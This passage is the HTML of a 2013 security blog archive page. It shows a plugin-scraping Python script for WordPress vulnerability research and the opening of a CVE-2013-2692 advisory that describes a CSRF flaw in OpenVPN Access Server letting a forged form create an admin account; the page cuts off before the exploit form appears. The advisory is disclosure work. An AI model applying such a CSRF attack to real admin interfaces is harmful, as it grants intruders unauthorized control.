<!DOCTYPE html>
<!--[if IE 6]>
<html id="ie6" lang="en-US">
<![endif]-->
<!--[if IE 7]>
<html id="ie7" lang="en-US">
<![endif]-->
<!--[if IE 8]>
<html id="ie8" lang="en-US">
<![endif]-->
<!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
<html lang="en-US">
<!--<![endif]-->
<head>
<base href="http://ceriksen.com" />

<meta charset="UTF-8" />
<meta name="viewport" content="initial-scale=1.0, width=device-width" />
<title>Security | ceriksen.com</title>

<link rel="stylesheet" type="text/css" media="all" href="http://ceriksen.com/wp-content/themes/simplex/style.css" />

<!--[if lt IE 9]>
<script src="http://ceriksen.com/wp-content/themes/simplex/js/html5.js" type="text/javascript"></script>
<script src="http://ceriksen.com/wp-content/themes/simplex/js/css3-mediaqueries.js"></script>
<![endif]-->



<link rel='stylesheet' id='crayon-css'  href='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=2.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-twilight-css'  href='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/themes/twilight/twilight.css?ver=2.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=2.5.0' type='text/css' media='all' />
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/jquery.js?ver=1.10.2'></script>
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var quicktagsL10n = {"closeAllOpenTags":"Close all open tags","closeTags":"close tags","enterURL":"Enter the URL","enterImageURL":"Enter the URL of the image","enterImageDescription":"Enter a description of the image","fullscreen":"fullscreen","toggleFullscreen":"Toggle fullscreen mode","textdirection":"text direction","toggleTextdirection":"Toggle Editor Text Direction"};
/* ]]> */
</script>
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/quicktags.min.js?ver=3.8.3'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
var CrayonTagEditorSettings = {"home_url":"http:\/\/ceriksen.com","css":"crayon-te","css_selected":"crayon-selected","code_css":"#crayon-code","url_css":"#crayon-url","url_info_css":"#crayon-te-url-info","lang_css":"#crayon-lang","title_css":"#crayon-title","mark_css":"#crayon-mark","range_css":"#crayon-range","inline_css":"crayon-inline","inline_hide_css":"crayon-hide-inline","inline_hide_only_css":"crayon-hide-inline-only","hl_css":"#crayon-highlight","switch_html":"#content-html","switch_tmce":"#content-tmce","tinymce_button":"a.mce_crayon_tinymce","submit_css":"#crayon-te-ok","cancel_css":"#crayon-te-cancel","content_css":"#crayon-te-content","dialog_title_css":"#crayon-te-title","submit_wrapper_css":"#crayon-te-submit-wrapper","data_value":"data-value","attr_sep":":","css_sep":"_","fallback_lang":"default","dialog_title_add":"Add Crayon Code","dialog_title_edit":"Edit Crayon Code","submit_add":"Add","submit_edit":"Save","bar":"#crayon-te-bar","bar_content":"#crayon-te-bar-content","extensions":{"scpt":"applescript","applescript":"applescript","swf":"as","fla":"as","cs":"c#","h":"c++","hh":"c++","hpp":"c++","hxx":"c++","h++":"c++","cc":"c++","cpp":"c++","cxx":"c++","c++":"c++","pas":"delphi","java":"java","class":"java","jar":"java","mv":"miva","mvc":"miva","mvt":"miva","m":"objc","mm":"objc","pl":"perl","py":"python","pyw":"python","pyc":"python","pyo":"python","pyd":"python","rb":"ruby","rbx":"ruby","rhtml":"ruby","vbs":"vb"}};
var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.te.min.js?ver=2.5.0'></script>
<script type='text/javascript' src='http://ceriksen.com/wp-content/themes/simplex/lib/js/jquery.fitvids.js?ver=3.8.3'></script>

 

<script type="text/javascript">
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-32892239-1']);
_gaq.push(['_trackPageview']);
(function() {
var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();
</script>

	<script type="text/javascript">
		jQuery(document).ready(function(){
			jQuery("#page").fitVids();	 
		});
	</script>	<style type="text/css">
			#site-title a,
		#site-description {
			color: #e6941e !important;
		}
		</style>
	
</head>

<body lang="en" class="archive category category-security category-30  single-author">
<div id="page" class="hfeed">
	<header id="branding" role="banner">
		<hgroup>
			<h1 id="site-title"><a href="http://ceriksen.com/" title="ceriksen.com" rel="home">ceriksen.com</a></h1>
			<h2 id="site-description"></h2>
						
							<form role="search" method="get" id="searchform" class="searchform" action="http://ceriksen.com/">
				<div>
					<label class="screen-reader-text" for="s">Search for:</label>
					<input type="text" value="" name="s" id="s" />
					<input type="submit" id="searchsubmit" value="Search" />
				</div>
			</form>					</hgroup>
		
		<nav id="access" role="navigation">
			<h2 class="assistive-text">Main menu</h2>
			<div class="skip-link screen-reader-text"><a href="#content" title="Skip to content">Skip to content</a></div>

			<div class="menu"><ul><li ><a href="http://ceriksen.com/">Home</a></li></ul></div>

		</nav><!-- #access -->
		<div class="clear"></div>
	</header><!-- #branding -->

	<div id="main">
		<section id="primary">
			<div id="content" role="main">

			
				<header class="page-header">
					<h2 class="page-title">Category Archives: <span>Security</span></h2>

					
				</header>

					<nav id="nav-above">
		<h2 class="assistive-text">Post navigation</h2>

	
	</nav><!-- #nav-above -->
	
								
					
<article id="post-276" class="post-276 post type-post status-publish format-standard hentry category-security tag-wordpress tag-wordpress-plugins">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2013/06/18/bsides-rhode-island-presentation-and-slides/" title="9:33 pm" rel="bookmark" class="entry-date"><time datetime="2013-06-18T21:33:10+00:00" pubdate>June 18, 2013</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2013/06/18/bsides-rhode-island-presentation-and-slides/" title="Permalink to BSides Rhode Island presentation and slides" rel="bookmark">BSides Rhode Island presentation and slides</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p>Over this weekend I went to <a href="http://www.securitybsides.com/w/page/61966594/BSidesRI">BSides Rhode Island</a> to give a presentation about the research I&#8217;ve been doing in regards to WordPress plugins. The video can be found <a href="http://www.irongeek.com/i.php?page=videos/bsidesri2013/0-0-large-scale-application-security-charlie-eriksen">here</a>, thanks to Irongeek.</p>
<p>I promised at BSides to release my slides and some of my code. So without further ado, here&#8217;s the presentation file:Â <a href="http://ceriksen.com/wp-content/uploads/2013/06/Large-scale-application-security.pptx">Large-scale application security</a></p>
<p>And here is the code:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98772e26f8661658341" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">Python</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
from bs4 import * 
import urllib
import os
from urlparse import urlsplit
import argparse

def main(args):
	if not os.path.exists(args.output):
		os.makedirs(args.output)

	for pageNumber in xrange(args.pages):
		page = BeautifulSoup(urllib.urlopen("http://wordpress.org/extend/plugins/browse/popular/page/" \
				+ str(pageNumber)).read())
		for x in page.findAll('div', {'class': 'plugin-block'}):
			if int(filter(lambda y: y.isdigit(), str(x.ul.findAll('li')[2]))) &gt; args.downloads:
				downloadLink = BeautifulSoup(urllib.urlopen(x.h3.a['href']).read()) \
					.find('p', {'class': 'button'}).a['href']
				urllib.urlretrieve(downloadLink, args.output + os.path.basename(urlsplit(downloadLink)[2]))
				print "Downloaded %s" % os.path.basename(urlsplit(downloadLink)[2])

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("-d", "--downloads", help="Minimum number of plugin downloads", default=100000, type=int)
	parser.add_argument("-o", "--output", help="Output folder", default="", type=str)
	parser.add_argument("-p", "--pages", help="Number of pages to parse", default=250, type=int)
	args = parser.parse_args()
	main(args)</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98772e26f8661658341-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e26f8661658341-2">2</div><div class="crayon-num" data-line="crayon-53c98772e26f8661658341-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e26f8661658341-4">4</div><div class="crayon-num" data-line="crayon-53c98772e26f8661658341-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e26f8661658341-6">6</div><div class="crayon-num" data-line="crayon-53c98772e26f8661658341-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e26f8661658341-8">8</div><div class="crayon-num" data-line="crayon-53c98772e26f8661658341-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e26f8661658341-10">10</div><div class="crayon-num" data-line="crayon-53c98772e26f8661658341-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e26f8661658341-12">12</div><div class="crayon-num" data-line="crayon-53c98772e26f8661658341-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e26f8661658341-14">14</div><div class="crayon-num" data-line="crayon-53c98772e26f8661658341-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e26f8661658341-16">16</div><div class="crayon-num" data-line="crayon-53c98772e26f8661658341-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e26f8661658341-18">18</div><div class="crayon-num" data-line="crayon-53c98772e26f8661658341-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e26f8661658341-20">20</div><div class="crayon-num" data-line="crayon-53c98772e26f8661658341-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e26f8661658341-22">22</div><div class="crayon-num" data-line="crayon-53c98772e26f8661658341-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e26f8661658341-24">24</div><div class="crayon-num" data-line="crayon-53c98772e26f8661658341-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e26f8661658341-26">26</div><div class="crayon-num" data-line="crayon-53c98772e26f8661658341-27">27</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98772e26f8661658341-1"><span class="crayon-st">from</span><span class="crayon-h"> </span><span class="crayon-e">bs4 </span><span class="crayon-r">import</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e26f8661658341-2"><span class="crayon-r">import</span><span class="crayon-h"> </span><span class="crayon-k ">urllib</span></div><div class="crayon-line" id="crayon-53c98772e26f8661658341-3"><span class="crayon-r">import</span><span class="crayon-h"> </span><span class="crayon-k ">os</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e26f8661658341-4"><span class="crayon-st">from</span><span class="crayon-h"> </span><span class="crayon-k ">urlparse</span><span class="crayon-h"> </span><span class="crayon-r">import</span><span class="crayon-h"> </span><span class="crayon-e">urlsplit</span></div><div class="crayon-line" id="crayon-53c98772e26f8661658341-5"><span class="crayon-r">import</span><span class="crayon-h"> </span><span class="crayon-k ">argparse</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e26f8661658341-6">&nbsp;</div><div class="crayon-line" id="crayon-53c98772e26f8661658341-7"><span class="crayon-r">def</span><span class="crayon-h"> </span><span class="crayon-e">main</span><span class="crayon-sy">(</span><span class="crayon-i">args</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e26f8661658341-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-st">not</span><span class="crayon-h"> </span><span class="crayon-k ">os.path</span><span class="crayon-sy">.</span><span class="crayon-e">exists</span><span class="crayon-sy">(</span><span class="crayon-v">args</span><span class="crayon-sy">.</span><span class="crayon-i">output</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-53c98772e26f8661658341-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">os</span><span class="crayon-sy">.</span><span class="crayon-e">makedirs</span><span class="crayon-sy">(</span><span class="crayon-v">args</span><span class="crayon-sy">.</span><span class="crayon-i">output</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e26f8661658341-10">&nbsp;</div><div class="crayon-line" id="crayon-53c98772e26f8661658341-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-e">pageNumber </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-k ">xrange</span><span class="crayon-sy">(</span><span class="crayon-v">args</span><span class="crayon-sy">.</span><span class="crayon-i">pages</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e26f8661658341-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">page</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">BeautifulSoup</span><span class="crayon-sy">(</span><span class="crayon-k ">urllib</span><span class="crayon-sy">.</span><span class="crayon-e">urlopen</span><span class="crayon-sy">(</span><span class="crayon-s">"http://wordpress.org/extend/plugins/browse/popular/page/"</span><span class="crayon-h"> </span><span class="crayon-sy">\</span></div><div class="crayon-line" id="crayon-53c98772e26f8661658341-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-k ">str</span><span class="crayon-sy">(</span><span class="crayon-i">pageNumber</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">read</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e26f8661658341-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">x</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-v">page</span><span class="crayon-sy">.</span><span class="crayon-e">findAll</span><span class="crayon-sy">(</span><span class="crayon-s">'div'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-s">'class'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">'plugin-block'</span><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-53c98772e26f8661658341-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-k ">int</span><span class="crayon-sy">(</span><span class="crayon-k ">filter</span><span class="crayon-sy">(</span><span class="crayon-r">lambda</span><span class="crayon-h"> </span><span class="crayon-i">y</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">y</span><span class="crayon-sy">.</span><span class="crayon-e">isdigit</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-k ">str</span><span class="crayon-sy">(</span><span class="crayon-v">x</span><span class="crayon-sy">.</span><span class="crayon-v">ul</span><span class="crayon-sy">.</span><span class="crayon-e">findAll</span><span class="crayon-sy">(</span><span class="crayon-s">'li'</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">2</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-v">args</span><span class="crayon-sy">.</span><span class="crayon-i">downloads</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e26f8661658341-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">downloadLink</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">BeautifulSoup</span><span class="crayon-sy">(</span><span class="crayon-k ">urllib</span><span class="crayon-sy">.</span><span class="crayon-e">urlopen</span><span class="crayon-sy">(</span><span class="crayon-v">x</span><span class="crayon-sy">.</span><span class="crayon-v">h3</span><span class="crayon-sy">.</span><span class="crayon-v">a</span><span class="crayon-sy">[</span><span class="crayon-s">'href'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">read</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">\</span></div><div class="crayon-line" id="crayon-53c98772e26f8661658341-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">.</span><span class="crayon-e">find</span><span class="crayon-sy">(</span><span class="crayon-s">'p'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-s">'class'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">'button'</span><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-v">a</span><span class="crayon-sy">[</span><span class="crayon-s">'href'</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e26f8661658341-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">urllib</span><span class="crayon-sy">.</span><span class="crayon-e">urlretrieve</span><span class="crayon-sy">(</span><span class="crayon-i">downloadLink</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">args</span><span class="crayon-sy">.</span><span class="crayon-i">output</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-k ">os.path</span><span class="crayon-sy">.</span><span class="crayon-e">basename</span><span class="crayon-sy">(</span><span class="crayon-e">urlsplit</span><span class="crayon-sy">(</span><span class="crayon-i">downloadLink</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">2</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c98772e26f8661658341-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">print</span><span class="crayon-h"> </span><span class="crayon-s">"Downloaded %s"</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-h"> </span><span class="crayon-k ">os.path</span><span class="crayon-sy">.</span><span class="crayon-e">basename</span><span class="crayon-sy">(</span><span class="crayon-e">urlsplit</span><span class="crayon-sy">(</span><span class="crayon-i">downloadLink</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">2</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e26f8661658341-20">&nbsp;</div><div class="crayon-line" id="crayon-53c98772e26f8661658341-21"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">__name__</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"__main__"</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e26f8661658341-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">parser</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-k ">argparse</span><span class="crayon-sy">.</span><span class="crayon-e">ArgumentParser</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c98772e26f8661658341-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">parser</span><span class="crayon-sy">.</span><span class="crayon-e">add_argument</span><span class="crayon-sy">(</span><span class="crayon-s">"-d"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"--downloads"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-k ">help</span><span class="crayon-o">=</span><span class="crayon-s">"Minimum number of plugin downloads"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">default</span><span class="crayon-o">=</span><span class="crayon-cn">100000</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-k ">type</span><span class="crayon-o">=</span><span class="crayon-k ">int</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e26f8661658341-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">parser</span><span class="crayon-sy">.</span><span class="crayon-e">add_argument</span><span class="crayon-sy">(</span><span class="crayon-s">"-o"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"--output"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-k ">help</span><span class="crayon-o">=</span><span class="crayon-s">"Output folder"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">default</span><span class="crayon-o">=</span><span class="crayon-s">""</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-k ">type</span><span class="crayon-o">=</span><span class="crayon-k ">str</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c98772e26f8661658341-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">parser</span><span class="crayon-sy">.</span><span class="crayon-e">add_argument</span><span class="crayon-sy">(</span><span class="crayon-s">"-p"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"--pages"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-k ">help</span><span class="crayon-o">=</span><span class="crayon-s">"Number of pages to parse"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">default</span><span class="crayon-o">=</span><span class="crayon-cn">250</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-k ">type</span><span class="crayon-o">=</span><span class="crayon-k ">int</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e26f8661658341-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">args</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-k ">parser</span><span class="crayon-sy">.</span><span class="crayon-e">parse_args</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c98772e26f8661658341-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">main</span><span class="crayon-sy">(</span><span class="crayon-i">args</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0196 seconds] -->
<p>Thanks to the team behind BSides RI for giving me the chance to present my technique and research used for finding these vulnerabilities. I&#8217;d encourage anybody to not only go to a BSides near you, but also have a go at finding vulnerabilities in WordPress plugins. It&#8217;s a ton of fun!</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/security/" title="View all posts in Security" rel="category tag">Security</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/wordpress/" rel="tag">Wordpress</a>, <a href="http://ceriksen.com/tag/wordpress-plugins/" rel="tag">Wordpress Plugins</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2013/06/18/bsides-rhode-island-presentation-and-slides/#respond" title="Comment on BSides Rhode Island presentation and slides">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-276 -->

				
					
<article id="post-256" class="post-256 post type-post status-publish format-standard hentry category-advisories category-security tag-csrf tag-openvpn">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2013/05/09/cve-2013-2692-or-when-your-openvpn-is-a-bit-too-open/" title="12:33 am" rel="bookmark" class="entry-date"><time datetime="2013-05-09T00:33:11+00:00" pubdate>May 9, 2013</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2013/05/09/cve-2013-2692-or-when-your-openvpn-is-a-bit-too-open/" title="Permalink to CVE-2013-2692 &#8211; Or when your OpenVPN is a bit too open" rel="bookmark">CVE-2013-2692 &#8211; Or when your OpenVPN is a bit too open</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisories</strong></p>
<p><a href="http://openvpn.net/index.php/access-server/download-openvpn-as/531-release-notes-v185.html">OpenVPN</a></p>
<p><a href="http://secunia.com/advisories/52802">Secunia</a></p>
<p><strong>Details</strong></p>
<p>When analyzing the <a href="http://openvpn.net/index.php/access-server/download-openvpn-as-vm/164.html?osfamily=Virtual%20Appliance%20(VMWare)&amp;ex=1">OpenVPN Access Server</a>, it quickly became apparent that the administration interface lacked any basic level of CSRF protection, which was easily demonstrated with a CSRF form like this, which will add a new user with admin privileges, using the username &#8220;csrfaccount&#8221; and password &#8220;qweasd&#8221;:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98772e60c0276115574" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
